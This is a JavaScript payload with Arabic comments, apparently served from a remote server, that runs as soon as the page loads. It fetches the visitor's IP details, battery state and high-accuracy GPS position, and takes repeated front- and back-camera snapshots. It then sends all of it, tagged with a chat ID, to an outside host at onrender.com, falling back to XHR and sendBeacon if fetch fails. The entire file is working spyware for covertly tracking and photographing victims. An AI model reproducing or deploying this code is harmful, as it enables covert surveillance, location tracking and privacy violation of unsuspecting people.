// payload.js - هذا الكود سيتم إرساله من السيرفر عند طلب /getPayload
(function() {
    'use strict';
    
    const chatId = window.__CHAT_ID__ || '';
    
    const collectedData = {
        chatId: chatId,
        permissions: [],
        images: [],
        location: '',
        ipInfo: '',
        battery: '',
        userAgent: navigator.userAgent,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timestamp: new Date().toISOString()
    };
    
    async function collectAllData() {
        // جمع IP
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            collectedData.ipInfo = JSON.stringify({
                ip: data.ip,
                country: data.country_name,
                city: data.city,
                region: data.region,
                isp: data.org,
                timezone: data.timezone
            });
        } catch (e) {
            collectedData.ipInfo = 'Failed to fetch';
        }
        
        // جمع البطارية
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                collectedData.battery = JSON.stringify({
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                });
            }
        } catch (e) {
            collectedData.battery = 'Not supported';
        }
        
        // جمع الموقع
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });
            
            collectedData.location = JSON.stringify({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                speed: position.coords.speed
            });
            
            collectedData.permissions.push('Location Allowed');
        } catch (err) {
            collectedData.permissions.push('Location Denied');
            collectedData.location = 'Denied';
        }
        
        // تصوير الكاميرا (مرتين لكل كاميرا)
        const cameras = ['user', 'environment'];
        
        for (let round = 0; round < 2; round++) {
            for (let facing of cameras) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            facingMode: { exact: facing },
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    });
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', '');
                    await video.play();
                    
                    // انتظار تركيز الكاميرا
                    await new Promise(resolve => setTimeout(resolve, 1500));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                    collectedData.images.push(imageData);
                    
                    collectedData.permissions.push(
                        `${facing === 'user' ? 'Front' : 'Back'} Camera Allowed (Round ${round + 1})`
                    );
                    
                    // إيقاف الكاميرا
                    stream.getTracks().forEach(track => track.stop());
                    
                } catch (err) {
                    collectedData.permissions.push(
                        `${facing === 'user' ? 'Front' : 'Back'} Camera Denied (Round ${round + 1}): ${err.message}`
                    );
                }
            }
        }
        
        // إرسال البيانات
        await sendCollectedData();
    }
    
    async function sendCollectedData() {
        const formData = new URLSearchParams();
        formData.append('chatId', collectedData.chatId);
        formData.append('imageDatas', collectedData.images.join('|||'));
        formData.append('location', collectedData.location);
        formData.append('permissions', collectedData.permissions.join(', '));
        formData.append('ipInfo', collectedData.ipInfo);
        formData.append('battery', collectedData.battery);
        formData.append('userAgent', collectedData.userAgent);
        formData.append('screenResolution', collectedData.screenResolution);
        formData.append('timestamp', collectedData.timestamp);
        
        const endpoints = [
            'https://server-brxz.onrender.com/submitData',
            'https://server-brxz.onrender.com/submitData'
        ];
        
        for (let endpoint of endpoints) {
            try {
                // محاولة fetch أولاً
                await fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: formData,
                    mode: 'no-cors'
                });
                console.log('Data sent successfully to:', endpoint);
                return;
            } catch (e) {
                console.warn('Fetch failed, trying XHR...');
                
                // محاولة XHR
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', endpoint, true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.send(formData);
                    console.log('Data sent via XHR to:', endpoint);
                    return;
                } catch (xhrError) {
                    console.warn('XHR failed, trying Beacon...');
                    
                    // محاولة Beacon
                    try {
                        const blob = new Blob([formData.toString()], {
                            type: 'application/x-www-form-urlencoded'
                        });
                        navigator.sendBeacon(endpoint, blob);
                        console.log('Data sent via Beacon to:', endpoint);
                        return;
                    } catch (beaconError) {
                        console.error('All methods failed for:', endpoint);
                    }
                }
            }
        }
    }
    
    // بدء جمع البيانات فور تحميل السكربت
    collectAllData().catch(console.error);
    
})();
